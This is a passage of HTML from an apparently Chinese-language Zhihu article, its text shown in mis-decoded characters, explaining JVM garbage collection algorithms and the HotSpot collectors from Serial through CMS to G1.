data-rawheight=\"339\" class=\"origin_image zh-lightbox-thumb\" width=\"650\" data-original=\"https://pic3.zhimg.com/v2-8fa24f2ef95d40e1357f4c2fe897eb9a_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;650&#39; height=&#39;339&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"650\" data-rawheight=\"339\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"650\" data-original=\"https://pic3.zhimg.com/v2-8fa24f2ef95d40e1357f4c2fe897eb9a_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-8fa24f2ef95d40e1357f4c2fe897eb9a_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å°†å†…å­˜åˆ’åˆ†ä¸ºå¤§å°ç›¸ç­‰çš„ä¸¤å—ï¼Œæ¯æ¬¡åªä½¿ç”¨å…¶ä¸­ä¸€å—ï¼Œå½“è¿™ä¸€å—å†…å­˜ç”¨å®Œäº†å°±å°†è¿˜å­˜æ´»çš„å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—ä¸Šé¢ï¼Œç„¶åå†æŠŠä½¿ç”¨è¿‡çš„å†…å­˜ç©ºé—´è¿›è¡Œä¸€æ¬¡æ¸…ç†ã€‚</p><p>ä¸»è¦ä¸è¶³æ˜¯åªä½¿ç”¨äº†å†…å­˜çš„ä¸€åŠã€‚</p><p>ç°åœ¨çš„å•†ä¸šè™šæ‹Ÿæœºéƒ½é‡‡ç”¨è¿™ç§æ”¶é›†ç®—æ³•å›æ”¶æ–°ç”Ÿä»£ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯åˆ’åˆ†ä¸ºå¤§å°ç›¸ç­‰çš„ä¸¤å—ï¼Œè€Œæ˜¯ä¸€å—è¾ƒå¤§çš„ Eden ç©ºé—´å’Œä¸¤å—è¾ƒå°çš„ Survivor ç©ºé—´ï¼Œæ¯æ¬¡ä½¿ç”¨ Eden å’Œå…¶ä¸­ä¸€å— Survivorã€‚åœ¨å›æ”¶æ—¶ï¼Œå°† Eden å’Œ Survivor ä¸­è¿˜å­˜æ´»ç€çš„å¯¹è±¡å…¨éƒ¨å¤åˆ¶åˆ°å¦ä¸€å— Survivor ä¸Šï¼Œæœ€åæ¸…ç† Eden å’Œä½¿ç”¨è¿‡çš„é‚£ä¸€å— Survivorã€‚</p><p>HotSpot è™šæ‹Ÿæœºçš„ Eden å’Œ Survivor å¤§å°æ¯”ä¾‹é»˜è®¤ä¸º 8:1ï¼Œä¿è¯äº†å†…å­˜çš„åˆ©ç”¨ç‡è¾¾åˆ° 90%ã€‚å¦‚æœæ¯æ¬¡å›æ”¶æœ‰å¤šäº 10% çš„å¯¹è±¡å­˜æ´»ï¼Œé‚£ä¹ˆä¸€å— Survivor å°±ä¸å¤Ÿç”¨äº†ï¼Œæ­¤æ—¶éœ€è¦ä¾èµ–äºè€å¹´ä»£è¿›è¡Œç©ºé—´åˆ†é…æ‹…ä¿ï¼Œä¹Ÿå°±æ˜¯å€Ÿç”¨è€å¹´ä»£çš„ç©ºé—´å­˜å‚¨æ”¾ä¸ä¸‹çš„å¯¹è±¡ã€‚</p><h3>4. åˆ†ä»£æ”¶é›†</h3><p>ç°åœ¨çš„å•†ä¸šè™šæ‹Ÿæœºé‡‡ç”¨åˆ†ä»£æ”¶é›†ç®—æ³•ï¼Œå®ƒæ ¹æ®å¯¹è±¡å­˜æ´»å‘¨æœŸå°†å†…å­˜åˆ’åˆ†ä¸ºå‡ å—ï¼Œä¸åŒå—é‡‡ç”¨é€‚å½“çš„æ”¶é›†ç®—æ³•ã€‚</p><p>ä¸€èˆ¬å°†å †åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€å¹´ä»£ã€‚</p><ul><li>æ–°ç”Ÿä»£ä½¿ç”¨ï¼šå¤åˆ¶ç®—æ³•</li><li>è€å¹´ä»£ä½¿ç”¨ï¼šæ ‡è®° - æ¸…é™¤ æˆ–è€… æ ‡è®° - æ•´ç† ç®—æ³•</li></ul><h2>åƒåœ¾æ”¶é›†å™¨</h2><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-d43a7060a00c6beb905f3c24fd386ef8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"646\" data-rawheight=\"391\" class=\"origin_image zh-lightbox-thumb\" width=\"646\" data-original=\"https://pic1.zhimg.com/v2-d43a7060a00c6beb905f3c24fd386ef8_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;646&#39; height=&#39;391&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"646\" data-rawheight=\"391\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"646\" data-original=\"https://pic1.zhimg.com/v2-d43a7060a00c6beb905f3c24fd386ef8_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-d43a7060a00c6beb905f3c24fd386ef8_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>ä»¥ä¸Šæ˜¯ HotSpot è™šæ‹Ÿæœºä¸­çš„ 7 ä¸ªåƒåœ¾æ”¶é›†å™¨ï¼Œè¿çº¿è¡¨ç¤ºåƒåœ¾æ”¶é›†å™¨å¯ä»¥é…åˆä½¿ç”¨ã€‚</p><ul><li>å•çº¿ç¨‹ä¸å¤šçº¿ç¨‹ï¼šå•çº¿ç¨‹æŒ‡çš„æ˜¯åƒåœ¾æ”¶é›†å™¨åªä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹ï¼Œè€Œå¤šçº¿ç¨‹ä½¿ç”¨å¤šä¸ªçº¿ç¨‹ï¼›</li><li>ä¸²è¡Œä¸å¹¶è¡Œï¼šä¸²è¡ŒæŒ‡çš„æ˜¯åƒåœ¾æ”¶é›†å™¨ä¸ç”¨æˆ·ç¨‹åºäº¤æ›¿æ‰§è¡Œï¼Œè¿™æ„å‘³ç€åœ¨æ‰§è¡Œåƒåœ¾æ”¶é›†çš„æ—¶å€™éœ€è¦åœé¡¿ç”¨æˆ·ç¨‹åºï¼›å¹¶è¡ŒæŒ‡çš„æ˜¯åƒåœ¾æ”¶é›†å™¨å’Œç”¨æˆ·ç¨‹åºåŒæ—¶æ‰§è¡Œã€‚é™¤äº† CMS å’Œ G1 ä¹‹å¤–ï¼Œå…¶å®ƒåƒåœ¾æ”¶é›†å™¨éƒ½æ˜¯ä»¥ä¸²è¡Œçš„æ–¹å¼æ‰§è¡Œã€‚</li></ul><h3>1. Serial æ”¶é›†å™¨</h3><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-08897b0e82d7a2b16424d30cca15284a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"722\" data-rawheight=\"281\" class=\"origin_image zh-lightbox-thumb\" width=\"722\" data-original=\"https://pic3.zhimg.com/v2-08897b0e82d7a2b16424d30cca15284a_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;722&#39; height=&#39;281&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"722\" data-rawheight=\"281\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"722\" data-original=\"https://pic3.zhimg.com/v2-08897b0e82d7a2b16424d30cca15284a_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-08897b0e82d7a2b16424d30cca15284a_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>Serial ç¿»è¯‘ä¸ºä¸²è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä»¥ä¸²è¡Œçš„æ–¹å¼æ‰§è¡Œã€‚</p><p>å®ƒæ˜¯å•çº¿ç¨‹çš„æ”¶é›†å™¨ï¼Œåªä¼šä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œåƒåœ¾æ”¶é›†å·¥ä½œã€‚</p><p>å®ƒçš„ä¼˜ç‚¹æ˜¯ç®€å•é«˜æ•ˆï¼Œåœ¨å•ä¸ª CPU ç¯å¢ƒä¸‹ï¼Œç”±äºæ²¡æœ‰çº¿ç¨‹äº¤äº’çš„å¼€é”€ï¼Œå› æ­¤æ‹¥æœ‰æœ€é«˜çš„å•çº¿ç¨‹æ”¶é›†æ•ˆç‡ã€‚</p><p>å®ƒæ˜¯ Client åœºæ™¯ä¸‹çš„é»˜è®¤æ–°ç”Ÿä»£æ”¶é›†å™¨ï¼Œå› ä¸ºåœ¨è¯¥åœºæ™¯ä¸‹å†…å­˜ä¸€èˆ¬æ¥è¯´ä¸ä¼šå¾ˆå¤§ã€‚å®ƒæ”¶é›†ä¸€ä¸¤ç™¾å…†åƒåœ¾çš„åœé¡¿æ—¶é—´å¯ä»¥æ§åˆ¶åœ¨ä¸€ç™¾å¤šæ¯«ç§’ä»¥å†…ï¼Œåªè¦ä¸æ˜¯å¤ªé¢‘ç¹ï¼Œè¿™ç‚¹åœé¡¿æ—¶é—´æ˜¯å¯ä»¥æ¥å—çš„ã€‚</p><h3>2. ParNew æ”¶é›†å™¨</h3><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-1b3ebac8fd28f9a3112670e8d6de3a2a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"716\" data-rawheight=\"263\" class=\"origin_image zh-lightbox-thumb\" width=\"716\" data-original=\"https://pic3.zhimg.com/v2-1b3ebac8fd28f9a3112670e8d6de3a2a_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;716&#39; height=&#39;263&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"716\" data-rawheight=\"263\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"716\" data-original=\"https://pic3.zhimg.com/v2-1b3ebac8fd28f9a3112670e8d6de3a2a_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-1b3ebac8fd28f9a3112670e8d6de3a2a_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å®ƒæ˜¯ Serial æ”¶é›†å™¨çš„å¤šçº¿ç¨‹ç‰ˆæœ¬ã€‚</p><p>å®ƒæ˜¯ Server åœºæ™¯ä¸‹é»˜è®¤çš„æ–°ç”Ÿä»£æ”¶é›†å™¨ï¼Œé™¤äº†æ€§èƒ½åŸå› å¤–ï¼Œä¸»è¦æ˜¯å› ä¸ºé™¤äº† Serial æ”¶é›†å™¨ï¼Œåªæœ‰å®ƒèƒ½ä¸ CMS æ”¶é›†å™¨é…åˆä½¿ç”¨ã€‚</p><h3>3. Parallel Scavenge æ”¶é›†å™¨</h3><p>ä¸ ParNew ä¸€æ ·æ˜¯å¤šçº¿ç¨‹æ”¶é›†å™¨ã€‚</p><p>å…¶å®ƒæ”¶é›†å™¨ç›®æ ‡æ˜¯å°½å¯èƒ½ç¼©çŸ­åƒåœ¾æ”¶é›†æ—¶ç”¨æˆ·çº¿ç¨‹çš„åœé¡¿æ—¶é—´ï¼Œè€Œå®ƒçš„ç›®æ ‡æ˜¯è¾¾åˆ°ä¸€ä¸ªå¯æ§åˆ¶çš„ååé‡ï¼Œå› æ­¤å®ƒè¢«ç§°ä¸ºâ€œååé‡ä¼˜å…ˆâ€æ”¶é›†å™¨ã€‚è¿™é‡Œçš„ååé‡æŒ‡ CPU ç”¨äºè¿è¡Œç”¨æˆ·ç¨‹åºçš„æ—¶é—´å æ€»æ—¶é—´çš„æ¯”å€¼ã€‚</p><p>åœé¡¿æ—¶é—´è¶ŠçŸ­å°±è¶Šé€‚åˆéœ€è¦ä¸ç”¨æˆ·äº¤äº’çš„ç¨‹åºï¼Œè‰¯å¥½çš„å“åº”é€Ÿåº¦èƒ½æå‡ç”¨æˆ·ä½“éªŒã€‚è€Œé«˜ååé‡åˆ™å¯ä»¥é«˜æ•ˆç‡åœ°åˆ©ç”¨ CPU æ—¶é—´ï¼Œå°½å¿«å®Œæˆç¨‹åºçš„è¿ç®—ä»»åŠ¡ï¼Œé€‚åˆåœ¨åå°è¿ç®—è€Œä¸éœ€è¦å¤ªå¤šäº¤äº’çš„ä»»åŠ¡ã€‚</p><p>ç¼©çŸ­åœé¡¿æ—¶é—´æ˜¯ä»¥ç‰ºç‰²ååé‡å’Œæ–°ç”Ÿä»£ç©ºé—´æ¥æ¢å–çš„ï¼šæ–°ç”Ÿä»£ç©ºé—´å˜å°ï¼Œåƒåœ¾å›æ”¶å˜å¾—é¢‘ç¹ï¼Œå¯¼è‡´ååé‡ä¸‹é™ã€‚</p><p>å¯ä»¥é€šè¿‡ä¸€ä¸ªå¼€å…³å‚æ•°æ‰“å¼€ GC è‡ªé€‚åº”çš„è°ƒèŠ‚ç­–ç•¥ï¼ˆGC Ergonomicsï¼‰ï¼Œå°±ä¸éœ€è¦æ‰‹å·¥æŒ‡å®šæ–°ç”Ÿä»£çš„å¤§å°ï¼ˆ-Xmnï¼‰ã€Eden å’Œ Survivor åŒºçš„æ¯”ä¾‹ã€æ™‹å‡è€å¹´ä»£å¯¹è±¡å¹´é¾„ç­‰ç»†èŠ‚å‚æ•°äº†ã€‚è™šæ‹Ÿæœºä¼šæ ¹æ®å½“å‰ç³»ç»Ÿçš„è¿è¡Œæƒ…å†µæ”¶é›†æ€§èƒ½ç›‘æ§ä¿¡æ¯ï¼ŒåŠ¨æ€è°ƒæ•´è¿™äº›å‚æ•°ä»¥æä¾›æœ€åˆé€‚çš„åœé¡¿æ—¶é—´æˆ–è€…æœ€å¤§çš„ååé‡ã€‚</p><h3>4. Serial Old æ”¶é›†å™¨</h3><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-1c4c6fec6a11ffadcf3e0a2afcfd1de7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"734\" data-rawheight=\"271\" class=\"origin_image zh-lightbox-thumb\" width=\"734\" data-original=\"https://pic4.zhimg.com/v2-1c4c6fec6a11ffadcf3e0a2afcfd1de7_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;734&#39; height=&#39;271&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"734\" data-rawheight=\"271\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"734\" data-original=\"https://pic4.zhimg.com/v2-1c4c6fec6a11ffadcf3e0a2afcfd1de7_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-1c4c6fec6a11ffadcf3e0a2afcfd1de7_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>æ˜¯ Serial æ”¶é›†å™¨çš„è€å¹´ä»£ç‰ˆæœ¬ï¼Œä¹Ÿæ˜¯ç»™ Client åœºæ™¯ä¸‹çš„è™šæ‹Ÿæœºä½¿ç”¨ã€‚å¦‚æœç”¨åœ¨ Server åœºæ™¯ä¸‹ï¼Œå®ƒæœ‰ä¸¤å¤§ç”¨é€”ï¼š</p><ul><li>åœ¨ JDK 1.5 ä»¥åŠä¹‹å‰ç‰ˆæœ¬ï¼ˆParallel Old è¯ç”Ÿä»¥å‰ï¼‰ä¸­ä¸ Parallel Scavenge æ”¶é›†å™¨æ­é…ä½¿ç”¨ã€‚</li><li>ä½œä¸º CMS æ”¶é›†å™¨çš„åå¤‡é¢„æ¡ˆï¼Œåœ¨å¹¶å‘æ”¶é›†å‘ç”Ÿ Concurrent Mode Failure æ—¶ä½¿ç”¨ã€‚</li></ul><h3>5. Parallel Old æ”¶é›†å™¨</h3><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-3d67b5197f7c8776f22ce6cbc7d5e831_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"740\" data-rawheight=\"270\" class=\"origin_image zh-lightbox-thumb\" width=\"740\" data-original=\"https://pic2.zhimg.com/v2-3d67b5197f7c8776f22ce6cbc7d5e831_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;740&#39; height=&#39;270&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"740\" data-rawheight=\"270\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"740\" data-original=\"https://pic2.zhimg.com/v2-3d67b5197f7c8776f22ce6cbc7d5e831_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-3d67b5197f7c8776f22ce6cbc7d5e831_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>æ˜¯ Parallel Scavenge æ”¶é›†å™¨çš„è€å¹´ä»£ç‰ˆæœ¬ã€‚</p><p>åœ¨æ³¨é‡ååé‡ä»¥åŠ CPU èµ„æºæ•æ„Ÿçš„åœºåˆï¼Œéƒ½å¯ä»¥ä¼˜å…ˆè€ƒè™‘ Parallel Scavenge åŠ  Parallel Old æ”¶é›†å™¨ã€‚</p><h3>6. CMS æ”¶é›†å™¨</h3><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-635203d88706af1419aee561bfb39276_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"264\" class=\"origin_image zh-lightbox-thumb\" width=\"733\" data-original=\"https://pic3.zhimg.com/v2-635203d88706af1419aee561bfb39276_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;733&#39; height=&#39;264&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"264\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"733\" data-original=\"https://pic3.zhimg.com/v2-635203d88706af1419aee561bfb39276_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-635203d88706af1419aee561bfb39276_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>CMSï¼ˆConcurrent Mark Sweepï¼‰ï¼ŒMark Sweep æŒ‡çš„æ˜¯æ ‡è®° - æ¸…é™¤ç®—æ³•ã€‚</p><p>åˆ†ä¸ºä»¥ä¸‹å››ä¸ªæµç¨‹ï¼š</p><ul><li>åˆå§‹æ ‡è®°ï¼šä»…ä»…åªæ˜¯æ ‡è®°ä¸€ä¸‹ GC Roots èƒ½ç›´æ¥å…³è”åˆ°çš„å¯¹è±¡ï¼Œé€Ÿåº¦å¾ˆå¿«ï¼Œéœ€è¦åœé¡¿ã€‚</li><li>å¹¶å‘æ ‡è®°ï¼šè¿›è¡Œ GC Roots Tracing çš„è¿‡ç¨‹ï¼Œå®ƒåœ¨æ•´ä¸ªå›æ”¶è¿‡ç¨‹ä¸­è€—æ—¶æœ€é•¿ï¼Œä¸éœ€è¦åœé¡¿ã€‚</li><li>é‡æ–°æ ‡è®°ï¼šä¸ºäº†ä¿®æ­£å¹¶å‘æ ‡è®°æœŸé—´å› ç”¨æˆ·ç¨‹åºç»§ç»­è¿ä½œè€Œå¯¼è‡´æ ‡è®°äº§ç”Ÿå˜åŠ¨çš„é‚£ä¸€éƒ¨åˆ†å¯¹è±¡çš„æ ‡è®°è®°å½•ï¼Œéœ€è¦åœé¡¿ã€‚</li><li>å¹¶å‘æ¸…é™¤ï¼šä¸éœ€è¦åœé¡¿ã€‚</li></ul><p>åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­è€—æ—¶æœ€é•¿çš„å¹¶å‘æ ‡è®°å’Œå¹¶å‘æ¸…é™¤è¿‡ç¨‹ä¸­ï¼Œæ”¶é›†å™¨çº¿ç¨‹éƒ½å¯ä»¥ä¸ç”¨æˆ·çº¿ç¨‹ä¸€èµ·å·¥ä½œï¼Œä¸éœ€è¦è¿›è¡Œåœé¡¿ã€‚</p><p>å…·æœ‰ä»¥ä¸‹ç¼ºç‚¹ï¼š</p><ul><li>ååé‡ä½ï¼šä½åœé¡¿æ—¶é—´æ˜¯ä»¥ç‰ºç‰²ååé‡ä¸ºä»£ä»·çš„ï¼Œå¯¼è‡´ CPU åˆ©ç”¨ç‡ä¸å¤Ÿé«˜ã€‚</li><li>æ— æ³•å¤„ç†æµ®åŠ¨åƒåœ¾ï¼Œå¯èƒ½å‡ºç° Concurrent Mode Failureã€‚æµ®åŠ¨åƒåœ¾æ˜¯æŒ‡å¹¶å‘æ¸…é™¤é˜¶æ®µç”±äºç”¨æˆ·çº¿ç¨‹ç»§ç»­è¿è¡Œè€Œäº§ç”Ÿçš„åƒåœ¾ï¼Œè¿™éƒ¨åˆ†åƒåœ¾åªèƒ½åˆ°ä¸‹ä¸€æ¬¡ GC æ—¶æ‰èƒ½è¿›è¡Œå›æ”¶ã€‚ç”±äºæµ®åŠ¨åƒåœ¾çš„å­˜åœ¨ï¼Œå› æ­¤éœ€è¦é¢„ç•™å‡ºä¸€éƒ¨åˆ†å†…å­˜ï¼Œæ„å‘³ç€ CMS æ”¶é›†ä¸èƒ½åƒå…¶å®ƒæ”¶é›†å™¨é‚£æ ·ç­‰å¾…è€å¹´ä»£å¿«æ»¡çš„æ—¶å€™å†å›æ”¶ã€‚å¦‚æœé¢„ç•™çš„å†…å­˜ä¸å¤Ÿå­˜æ”¾æµ®åŠ¨åƒåœ¾ï¼Œå°±ä¼šå‡ºç° Concurrent Mode Failureï¼Œè¿™æ—¶è™šæ‹Ÿæœºå°†ä¸´æ—¶å¯ç”¨ Serial Old æ¥æ›¿ä»£ CMSã€‚</li><li>æ ‡è®° - æ¸…é™¤ç®—æ³•å¯¼è‡´çš„ç©ºé—´ç¢ç‰‡ï¼Œå¾€å¾€å‡ºç°è€å¹´ä»£ç©ºé—´å‰©ä½™ï¼Œä½†æ— æ³•æ‰¾åˆ°è¶³å¤Ÿå¤§è¿ç»­ç©ºé—´æ¥åˆ†é…å½“å‰å¯¹è±¡ï¼Œä¸å¾—ä¸æå‰è§¦å‘ä¸€æ¬¡ Full GCã€‚</li></ul><h3>7. G1 æ”¶é›†å™¨</h3><p>G1ï¼ˆGarbage-Firstï¼‰ï¼Œå®ƒæ˜¯ä¸€æ¬¾é¢å‘æœåŠ¡ç«¯åº”ç”¨çš„åƒåœ¾æ”¶é›†å™¨ï¼Œåœ¨å¤š CPU å’Œå¤§å†…å­˜çš„åœºæ™¯ä¸‹æœ‰å¾ˆå¥½çš„æ€§èƒ½ã€‚HotSpot å¼€å‘å›¢é˜Ÿèµ‹äºˆå®ƒçš„ä½¿å‘½æ˜¯æœªæ¥å¯ä»¥æ›¿æ¢æ‰ CMS æ”¶é›†å™¨ã€‚</p><p>å †è¢«åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€å¹´ä»£ï¼Œå…¶å®ƒæ”¶é›†å™¨è¿›è¡Œæ”¶é›†çš„èŒƒå›´éƒ½æ˜¯æ•´ä¸ªæ–°ç”Ÿä»£æˆ–è€…è€å¹´ä»£ï¼Œè€Œ G1 å¯ä»¥ç›´æ¥å¯¹æ–°ç”Ÿä»£å’Œè€å¹´ä»£ä¸€èµ·å›æ”¶ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-7c9d46c971f780d42eb9f93ba90c16df_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"735\" data-rawheight=\"413\" class=\"origin_image zh-lightbox-thumb\" width=\"735\" data-original=\"https://pic4.zhimg.com/v2-7c9d46c971f780d42eb9f93ba90c16df_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;735&#39; height=&#39;413&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"735\" data-rawheight=\"413\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"735\" data-original=\"https://pic4.zhimg.com/v2-7c9d46c971f780d42eb9f93ba90c16df_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-7c9d46c971f780d42eb9f93ba90c16df_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>G1 æŠŠå †åˆ’åˆ†æˆå¤šä¸ªå¤§å°ç›¸ç­‰çš„ç‹¬ç«‹åŒºåŸŸï¼ˆRegionï¼‰ï¼Œæ–°ç”Ÿä»£å’Œè€å¹´ä»£ä¸å†ç‰©ç†éš”ç¦»ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-8a3a8980055629dcf65e45639fc43dcd_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"713\" data-rawheight=\"511\" class=\"origin_image zh-lightbox-thumb\" width=\"713\" data-original=\"https://pic2.zhimg.com/v2-8a3a8980055629dcf65e45639fc43dcd_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;713&#39; height=&#39;511&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"713\" data-rawheight=\"511\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"713\" data-original=\"https://pic2.zhimg.com/v2-8a3a8980055629dcf65e45639fc43dcd_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-8a3a8980055629dcf65e45639fc43dcd_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>é€šè¿‡å¼•å…¥ Region çš„æ¦‚å¿µï¼Œä»è€Œå°†åŸæ¥çš„ä¸€æ•´å—å†…å­˜ç©ºé—´åˆ’åˆ†æˆå¤šä¸ªçš„å°ç©ºé—´ï¼Œä½¿å¾—æ¯ä¸ªå°ç©ºé—´å¯ä»¥å•ç‹¬è¿›è¡Œåƒåœ¾å›æ”¶ã€‚è¿™ç§åˆ’åˆ†æ–¹æ³•å¸¦æ¥äº†å¾ˆå¤§çš„çµæ´»æ€§ï¼Œä½¿å¾—å¯é¢„æµ‹çš„åœé¡¿æ—¶é—´æ¨¡å‹æˆä¸ºå¯èƒ½ã€‚é€šè¿‡è®°å½•æ¯ä¸ª Region åƒåœ¾å›æ”¶æ—¶é—´ä»¥åŠå›æ”¶æ‰€è·å¾—çš„ç©ºé—´ï¼ˆè¿™ä¸¤ä¸ªå€¼æ˜¯é€šè¿‡è¿‡å»å›æ”¶çš„ç»éªŒè·å¾—ï¼‰ï¼Œå¹¶ç»´æŠ¤ä¸€ä¸ªä¼˜å…ˆåˆ—è¡¨ï¼Œæ¯æ¬¡æ ¹æ®å…è®¸çš„æ”¶é›†æ—¶é—´ï¼Œä¼˜å…ˆå›æ”¶ä»·å€¼æœ€å¤§çš„ Regionã€‚</p><p>æ¯ä¸ª Region éƒ½æœ‰ä¸€ä¸ª Remembered Setï¼Œç”¨æ¥è®°å½•è¯¥ Region å¯¹è±¡çš„å¼•ç”¨å¯¹è±¡æ‰€åœ¨çš„ Regionã€‚é€šè¿‡ä½¿ç”¨ Remembered Setï¼Œåœ¨åšå¯è¾¾æ€§åˆ†æçš„æ—¶å€™å°±å¯ä»¥é¿å…å…¨å †æ‰«æã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-963fa8518101ed719913c6dd743aac34_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"763\" data-rawheight=\"249\" class=\"origin_image zh-lightbox-thumb\" width=\"763\" data-original=\"https://pic1.zhimg.com/v2-963fa8518101ed719913c6dd743aac34_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;763&#39; height=&#39;249&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"763\" data-rawheight=\"249\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"763\" data-original=\"https://pic1.zhimg.com/v2-963fa8518101ed719913c6dd743aac34_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-963fa8518101ed719913c6dd743aac34_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å¦‚æœä¸è®¡ç®—ç»´æŠ¤ Remembered Set çš„æ“ä½œï¼ŒG1 æ”¶é›†å™¨çš„è¿ä½œå¤§è‡´å¯åˆ’åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><ul><li>åˆå§‹æ ‡è®°</li><li>å¹¶å‘æ ‡è®°</li><li>æœ€ç»ˆæ ‡è®°ï¼šä¸ºäº†ä¿®æ­£åœ¨å¹¶å‘æ ‡è®°æœŸé—´å› ç”¨æˆ·ç¨‹åºç»§ç»­è¿ä½œè€Œå¯¼è‡´æ ‡è®°äº§ç”Ÿå˜åŠ¨çš„é‚£ä¸€éƒ¨åˆ†æ ‡è®°è®°å½•ï¼Œè™šæ‹Ÿæœºå°†è¿™æ®µæ—¶é—´å¯¹è±¡å˜åŒ–è®°å½•åœ¨çº¿ç¨‹çš„ Remembered Set Logs é‡Œé¢ï¼Œæœ€ç»ˆæ ‡è®°é˜¶æ®µéœ€è¦æŠŠ Remembered Set Logs çš„æ•°æ®åˆå¹¶åˆ° Remembered Set ä¸­ã€‚è¿™é˜¶æ®µéœ€è¦åœé¡¿çº¿ç¨‹ï¼Œä½†æ˜¯å¯å¹¶è¡Œæ‰§è¡Œã€‚</li><li>ç­›é€‰å›æ”¶ï¼šé¦–å…ˆå¯¹å„ä¸ª Region 